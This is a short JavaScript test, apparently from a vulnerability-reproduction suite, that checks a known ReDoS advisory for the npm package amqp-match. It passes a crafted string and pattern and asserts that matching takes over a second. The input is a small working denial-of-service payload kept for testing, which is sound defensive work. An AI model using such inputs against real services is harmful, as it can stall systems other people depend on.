//https://snyk.io/vuln/npm:amqp-match:20170515
test("ReDos in amqp-match", () => {
    const match = require('amqp-match');
    const measureTime = require("./utils").measureTime;
    
    let t = measureTime(function () {
        match('foooooooooooooooooooo', '#.bar')    });
  
    let time = t[0] + t[1] / 1000000000;
  
    expect(time).toBeGreaterThan(1);
  });
  